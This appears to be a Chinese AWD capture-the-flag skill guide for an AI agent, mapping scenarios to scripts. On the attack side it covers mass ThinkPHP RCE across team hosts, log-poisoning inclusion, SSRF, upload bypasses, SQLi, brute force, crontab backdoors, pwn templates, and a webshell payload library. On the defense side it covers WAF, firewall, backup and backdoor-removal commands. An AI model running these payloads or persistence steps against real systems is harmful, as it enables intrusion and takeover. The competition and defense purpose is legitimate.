- **Misc**：流量分析/隐写术/取证分析/编码解码/协议分析
- **Crypto**：对称/非对称攻击、哈希攻击、随机数预测
- **Reverse**：静态/动态/脱壳/反反调试
- **Mobile**：Android/iOS 逆向
- **Blockchain**：智能合约漏洞/重入攻击
- **通用防御**：Web/Pwn/系统级/应急响应清单
- **工具速查**：所有分类的常用工具列表

---

## 脚本库使用指南（Skill ↔ 代码映射）

本 skill 配套完整的可执行脚本，不是纯文档。按场景直接调用：

### 🚀 比赛启动（第一步）

| 场景 | 命令 | 说明 |
|------|------|------|
| **新开比赛** | `bash bootstrap_awd.sh <项目名> [域名模板] [起始队 结束队]` | 一键复制所有模板+payload+配置，生成新比赛项目目录 |
| 示例 | `bash bootstrap_awd.sh awd-final "192-168-1-{TEAM}.pvp7574.bugku.cn" 1 121` | 创建 awd-final/ 项目并填入配置 |
| 代码位置 | [bootstrap_awd.sh](file:///root/Documents/trae_projects/awd-AI/bootstrap_awd.sh) | 自动创建 7 类目录 + 5 种 webshell + 2 类 RCE payload + SQLi payload + 启动说明 |

### 🔍 侦察与批量攻击

| 场景 | 命令 | 说明 |
|------|------|------|
| **批量侦察 + 打 TP RCE** | `python3 tools/recon_template.py --domain-template "192-168-1-{X}.xxx.cn" --team-range 1 121 --attack --out flags.json` | 扫120个队 → 自动打ThinkPHP 3/5 RCE → 输出flag JSON |
| **日志投毒 + 包含** | `python3 attack/weblog_recon.py log-poison http://target` → `python3 attack/weblog_recon.py log-include http://target Runtime/Logs/Home/xx_xx_xx.log` | UA头写PHP+包含执行 |
| **SSRF 内网探测** | `python3 attack/weblog_recon.py ssrf-scan http://target url` | 探测127.0.0.1/Redis/云元数据/file:/// |
| **ThinkPHP 3 RCE** | 参考 [team117_combo.py](file:///root/Documents/trae_projects/awd-AI/attack/team117_combo.py) / [auto_attack.py](file:///root/Documents/trae_projects/awd-AI/attack/auto_attack.py) | 多参数位+多控制器爆破，并发+竞争条件 |
| **文件上传** | 参考 [team117_upload.py](file:///root/Documents/trae_projects/awd-AI/attack/team117_upload.py) / [file_upload.py](file:///root/Documents/trae_projects/awd-AI/attack/file_upload.py) | 扩展名绕过 + .htaccess/.user.ini + 路径遍历 + 竞争条件 |
| **SQL 注入** | 参考 [sql_injection.py](file:///root/Documents/trae_projects/awd-AI/attack/sql_injection.py) | Union/报错/盲注 3 种模式 |
| **弱口令爆破** | 参考 [brute_force.py](file:///root/Documents/trae_projects/awd-AI/attack/brute_force.py) / [command_exec.py](file:///root/Documents/trae_projects/awd-AI/attack/command_exec.py) | 后台/SSH/数据库爆破 |
| **后利用 / 权限维持** | 参考 [post_exploitation.py](file:///root/Documents/trae_projects/awd-AI/attack/post_exploitation.py) / [team2_backdoor.py](file:///root/Documents/trae_projects/awd-AI/attack/team2_backdoor.py) | 写多个后门 + crontab + 轮询flag |

### 🛡️ 加固自家靶机

| 场景 | 命令 | 说明 |
|------|------|------|
| **一键加固所有 (含 IP 白名单+流量监控+自动备份)** | `bash defense/defense_bootstrap.sh team@host:port "SSH密码" "后台新密码"` | **8 步自动化**：SSH连通→上传脚本→**⚡完整备份(止损底牌)**→部署WAF→**部署IP防火墙**(默认 deny + 自动识别 SSH 客户端 / Checker 加白 + 生成 3 层规则 + 应用 iptables)→清马+禁上传PHP→改密码(DB+admin+CookieKey)→**起 crontab (扫马/加密flag/重应用IP规则/每5分钟增量备份) + 起 traffic_monitor 守护** → 验证 WAF/IP 拦截效果 |
| 代码位置 | [defense_bootstrap.sh](file:///root/Documents/trae_projects/awd-AI/defense/defense_bootstrap.sh) | 用PHP改密码避免bash解析$问题，默认 deny 白名单模式，先加 SSH 客户端再封 |
| **💾 完整备份 (止损底牌)** | `bash defense/backup.sh full` 或 用上面的 bootstrap.sh 自动做 | 6 大块: Web源码+数据库+系统配置+IP规则+crontab+进程快照; sha256 校验; 自动 latest 软链接 |
| **💾 增量备份 (crontab 自动)** | `bash defense/backup.sh inc` (bootstrap.sh 已加 crontab 每5分钟) | 只打包最近 10 分钟 mtime 变更的文件，秒级完成 |
| 备份脚本代码 | [backup.sh](file:///root/Documents/trae_projects/awd-AI/defense/backup.sh) | 6 子命令 full/inc/list/latest/verify/purge，DB 密码自动从配置文件读 |
| **🚑 全量恢复 (秒级止损)** | `bash defense/restore.sh all` | 服务宕机时一键恢复: 校验→恢复IP防火墙→DB→Web→配置→清后门→重启→健康检查 |
| **🔍 篡改对比 (取证)** | `bash defense/restore.sh diff [备份目录]` | 对比 web 文件 + crontab + authorized_keys + 新增进程，定位攻击者改了什么 |
| 恢复脚本代码 | [restore.sh](file:///root/Documents/trae_projects/awd-AI/defense/restore.sh) | 11 个子命令: all/web/db/ipfw/waf/config/list/diff/restart/health/menu，恢复前自动做取证备份 |
| **IP 防火墙(通用管理)** | `python3 defense/ip_firewall.py init --whitelist wl.txt` → `add/rm/list/check/generate/apply/auto-ban` | 白名单 deny 模式；支持 CIDR；4 种输出（iptables/.htaccess/nginx/waf.php数组）；`apply iptables` 立即生效；`auto-ban` 一键拉黑+写日志 |
| IP 防火墙代码 | [ip_firewall.py](file:///root/Documents/trae_projects/awd-AI/defense/ip_firewall.py) | 8 个子命令 init/add/rm/list/check/generate/apply/auto-ban，状态目录 `/tmp/awd_ipfw` |
| **实时流量监控 + 自动封** | `bash defense/traffic_monitor.sh daemon "/var/log/apache2/access.log /var/log/nginx/access.log"` | 每条日志过 IP 决策 + 速率阈值（默认 10s/50 次）超限即封；支持 `start/daemon/stop/status`；多日志路径 tag |
| 流量监控代码 | [traffic_monitor.sh](file:///root/Documents/trae_projects/awd-AI/defense/traffic_monitor.sh) | 日志格式 auto 探测 (combined/common/nginx/simple)，去重冷却 30 分钟 |
| **WAF 部署 (含应用层 IP 拦截)** | `python3 defense/waf_installer.py --target user@host:port --ssh-pass xxx --mode deploy` 或 用上面的 bootstrap.sh | **PHP WAF 先做 IP 防火墙决策再跑 10 类特征检测**：SQLi/XSS/RCE/${@...}/文件包含/上传/目录遍历/序列化/SSTI/扫描器 |
| **WAF 代码 (L3 应用层)** | [waf.php](file:///root/Documents/trae_projects/awd-AI/defense/waf.php) | `/app/waf.php` 被入口文件 `require_once`；自动加载 `/tmp/awd_ipfw/ip_firewall.php`；命中自动写 iptables + 冷却窗口 |
| **弱密码加固脚本** | 参考 [security_harden.py](file:///root/Documents/trae_projects/awd-AI/defense/security_harden.py) / [auto_defense.sh](file:///root/Documents/trae_projects/awd-AI/defense/auto_defense.sh) | 密码强格式：Xy#2026Db$ecure! / Ad#2026Admin$ec! / Ck#2026$ecretKey!! |
| **漏洞修复** | [vuln_fixer.py](file:///root/Documents/trae_projects/awd-AI/defense/vuln_fixer.py) | 删除 Install/.git/.DS_Store + 配置文件640权限 + 上传目录禁PHP |
| **后门检测** | `python3 defense/backdoor_detector.py /app` | eval/assert/system 等 webshell 特征扫描 |
| **Flag 加密保护** | `python3 defense/flag_protector.py /flag encrypt` | AES/XOR/Base64/混淆/动态 5 种方式 |
| **日志备份** | `bash defense/log_backup.sh` | 日志轮转备份 |

### 💥 Pwn 二进制利用

| 场景 | 命令 | 说明 |
|------|------|------|
| **ret2text 本地** | `python3 tools/pwn_template.py --binary ./chall --mode ret2text --offset 72 --target 0x401234` | 跳到目标函数 |
| **ret2libc 本地** | `python3 tools/pwn_template.py --binary ./chall --mode ret2libc --offset 72 --libc ./libc.so.6` | 自动泄漏puts基址→计算system→调用system('/bin/sh') |
| **远程 ret2libc** | `--remote target.com:9999 --mode ret2libc ...` | 替换为远程模式 |
| **栈上执行 shellcode** | `--mode shellcode --shellcode ./shell.bin --offset 40` | NX disabled 时 |
| **格式化字符串** | `--mode fmt --fmt "%p%p%p%p%p%p%p%p"` | 计算参数偏移 |
| **ROP 链** | `--mode rop --libc ./libc.so.6` | 自动构造ROP |
| **自定义利用** | `--mode custom` | 打开脚本中 custom() 部分写逻辑 |
| 代码位置 | [pwn_template.py](file:///root/Documents/trae_projects/awd-AI/tools/pwn_template.py) | 支持 i386/amd64/arm/aarch64，含 checksec 打印 |
| 配套文档 | [classifications/pwn.md](file:///root/Documents/trae_projects/awd-AI/classifications/pwn.md) | checksec应对策略表 + 堆利用手法 + GDB 命令 + 编译防护参数 |

### 🧩 Misc 工具

| 场景 | 命令 | 说明 |
|------|------|------|
| **生成 Wireshark 过滤** | `python3 tools/misc_tools.py wireshark list` → `python3 tools/misc_tools.py wireshark flag` | 9 种常用过滤模板（flag/登录/密码/webshell/SQLi/DNS等） |
| **隐写自动检测** | `python3 tools/misc_tools.py steg-detect image.png` | 按文件类型（PNG/JPG/ZIP/PDF/其他）跑 binwalk/zsteg/steghide/foremost/strings/exiftool/pngcheck |
| **Volatility3 快捷** | `python3 tools/misc_tools.py vol3 mem.raw info,pslist,netscan,strings` | 7 种常用 vol 命令（信息/进程/网络/文件/命令/注册表/字符串） |
| **自动编码识别** | `python3 tools/misc_tools.py decode "SGVsbG8="` | 试 Base64/Hex/URL/ROT13/ROT47，命中关键词打印 |
| **端口扫描** | `python3 tools/misc_tools.py portscan 192.168.1.X [ports]` | nmap 常用端口（21-50070）扫描 |
| **未授权协议攻击** | `python3 tools/misc_tools.py proto-attack 192.168.1.X 6379` | 针对 Redis/Memcached/MongoDB/Hadoop/Docker/SMB/ES/HTTP 常用未授权 payload |
| 代码位置 | [misc_tools.py](file:///root/Documents/trae_projects/awd-AI/tools/misc_tools.py) | 6 个子命令统一 CLI |
| 配套文档 | [classifications/misc.md](file:///root/Documents/trae_projects/awd-AI/classifications/misc.md) | Wireshark 表达式大全 / 隐写决策树 / Vol 命令集 / 端口协议表 |

### 🔐 Crypto / Reverse / Mobile / Chain

| 类型 | 文档 | 工具说明 |
|------|------|----------|
| **Crypto** | [crypto.md](file:///root/Documents/trae_projects/awd-AI/classifications/crypto.md) | Wiener/Hastad/共模/Pollard/Coppersmith RSA 攻击代码 + MT19937克隆 + Padding Oracle |
| **Reverse** | [reverse.md](file:///root/Documents/trae_projects/awd-AI/classifications/reverse.md) | IDA快捷键 + Frida 反调试脚本 + GDB脚本 + 脱壳流程 |
| **Mobile** | [mobile.md](file:///root/Documents/trae_projects/awd-AI/classifications/mobile.md) | Android Frida Hook（SSL/Root/DB/SharedPreferences）+ iOS Frida + ADB命令 |
| **Blockchain** | [blockchain.md](file:///root/Documents/trae_projects/awd-AI/classifications/blockchain.md) | 重入攻击完整Solidity代码 + 审计清单 + Slither命令 |

### 📁 Payload 库（bootstrap_awd.sh 自动复制到新项目）

```
payloads/
├── webshells/
│   ├── shell_base.php      // @eval($_POST[cmd])
│   ├── shell_gif.php       // GIF89a + 图片马
│   ├── shell_get.php       // $_GET[a]($_POST[b])
│   ├── htaccess.txt        // AddType + SetHandler
│   └── user_ini.txt        // auto_prepend_file=shell.jpg
├── rce/
│   ├── thinkphp3_rce.txt   // 6 种 TP3 RCE payload
│   └── thinkphp5_rce.txt   // 2 种 TP5 RCE payload
└── sqli/
    └── common.txt          // 9 种 SQLi payload
```

### 🎯 场景-代码速查决策树

```
开赛前 5 分钟
  └─ bash bootstrap_awd.sh <比赛名> <域名模板> → 生成新项目 + START_HERE.txt

拿到 SSH 信息
  └─ bash defense/defense_bootstrap.sh user@host:port SSH密码 → 全自动化加固

比赛开始后 0-10 分钟
  └─ python3 tools/recon_template.py --attack → 扫队+打TP RCE 收割首批flag

自家靶机不稳 / WAF 拦截率低 / 大量陌生IP扫
  ├─ 第一步: 查 IP 规则 & 最近封禁 → python3 /tmp/ip_firewall.py list; tail -n 30 /tmp/awd_ipfw/ban.log; bash /tmp/traffic_monitor.sh status
  ├─ 确认 checker 没被误封 → 如果被封: ip_firewall.py add white <checkerIP> → generate waf/htaccess → 重应用 iptables
  ├─ 如果是 WAF 规则导致误杀自己攻击机: 立刻 ip_firewall.py add white <攻击机IP> (CIDR 更高效)
  ├─ 检查 /app/.htaccess 是否存在白名单 deny 规则 (L2 是否生效)
  ├─ 检查 defense/waf.php 是否生效 (curl -H 'X-Forwarded-For: 1.2.3.4' http://host/ 应 403)
  ├─ 运行 defense/vuln_fixer.py /app → 修漏
  └─ 误封太多应急切 allow 模式: sed -i 's|"default_policy": "deny"|"default_policy": "allow"|' /tmp/awd_ipfw/ip_rules.json + generate waf/htaccess 重应用

靶机被 DoS / 大量路径爆破 (单IP每秒几百条)
  └─ traffic_monitor.sh 已开 → 10s/50次 自动封; 没开 → 立刻 RATE_MAX_HITS=20 RATE_WINDOW_SEC=3 /tmp/traffic_monitor.sh daemon 日志路径 combined

自家靶机 403 太多, checker 连不上 (平台扣分)
  ├─ 查 ban.log 是否封了 checker → ip_firewall.py add white <checkerIP> 备注 platform_checker
  ├─ 查 iptables -L AWD_FW -n 是否 DROP 了 checker 段 CIDR
  ├─ (快速)把 AWD_WAF_DEFAULT_POLICY=allow 临时切黑名单模式保服务
  └─ 从 access.log 找 2xx 频率Top1-3 的非攻击机IP → 批量 add white

💥 服务宕机 / 被篡改 / rm -rf / 502 500 (平台持续扣分, 急!)
  ├─ 第一步 (10秒内): bash /tmp/restore.sh restart           # 只重启服务, 不动数据, 临时救活
  ├─ 仍然挂掉: bash /tmp/restore.sh all                       # 全量恢复到最近一次完整备份
  ├─ 想回到特定时间点: bash /tmp/restore.sh all <备份目录>     # bash /tmp/backup.sh list 先看可选哪些
  ├─ 只崩了 Web: bash /tmp/restore.sh web                     # 只恢复源码, 不动数据库
  ├─ 只崩了 DB:  bash /tmp/restore.sh db                      # 只恢复数据库
  ├─ 恢复完健康检查: bash /tmp/restore.sh health              # HTTP + WAF + 进程 + flag
  ├─ 取证 (查谁干的): bash /tmp/restore.sh diff               # 对比当前 vs 备份, 列出所有篡改点
  ├─ 把攻击者 IP 拉黑: python3 /tmp/ip_firewall.py auto-ban <attacker_ip> "rm -rf 攻击证据"
  └─ 立刻做新备份: bash /tmp/backup.sh full                   # 恢复后的干净版本作为新基线

🧨 不死马 / 内存马 (删了又出现的 webshell)
  ├─ 确认: ps aux | grep php-fpm 看 CPU 占用 + watch stat /app/.xxx.php 看 mtime 是否反复变
  ├─ 首选: service php-fpm restart   (或 systemctl restart php7.x-fpm / service apache2 restart)
  ├─ 退路: chattr +i /app/index.php /app/waf.php   (锁文件, 不死马写不进)
  ├─ 死磕: while true; do find /app -name "*.php" -newer /tmp/marker -delete; usleep 1000; done
  └─ 预防: php.ini disable_functions 加 ignore_user_abort (见 web.md §11.4)

🔑 发现 SSH 后门 / 异常端口监听
  ├─ 检测: ss -tlnp | grep -vE ":22 |:80 |:443 |:3306 "  +  file /usr/sbin/sshd (是否还是 ELF)
  ├─ 软链接后门: ps -ef | grep "/tmp/su\|/tmp/.sshd" → kill -9 + rm
  ├─ authorized_keys 后门: > ~/.ssh/authorized_keys + chmod 600
  └─ sshd 被替换: mv /usr/sbin/sshd.bak /usr/sbin/sshd + service sshd restart

📖 攻击时发现源码硬编码 / 备份文件泄露
  ├─ db.php 弱密码: 直接改连接 → 拿 webshell
  ├─ .git 泄露: wget -r http://target/.git/ → GitHack 还原源码 → 找新漏洞
  ├─ www.zip 备份: 下载 → 对比线上版本 → 找被删的隐藏后门
  └─ phpinfo: 拿绝对路径 + disable_functions + open_basedir 配置

遇到 TP RCE 修了, 有上传点
  ├─ attack/team117_upload.py → 扩展名绕过 + .htaccess
  └─ 有 WAF 拦 → weblog_recon.py log-poison + log-include → 日志包含拿shell

遇到 Pwn 题
  ├─ checksec binary → 决定利用方式
  └─ tools/pwn_template.py --mode X → 选模式直接用

遇到 Misc 题 (pcap/png/mem.raw)
  ├─ misc_tools.py wireshark flag → 生成 Wireshark 过滤
  ├─ misc_tools.py steg-detect file.png → 隐写
  └─ misc_tools.py vol3 mem.raw info,pslist,netscan → 内存取证

Flag 不变 / 被伪造
  └─ 参考 Skill 的「经验教训 2-6 条」→ 交叉验证 + 重新扫描

每 60 秒持续取 flag
  └─ while true; do python3 attack/auto_attack.py > logs/flags/round_$(date +%H%M%S).json; sleep 60; done &
```

---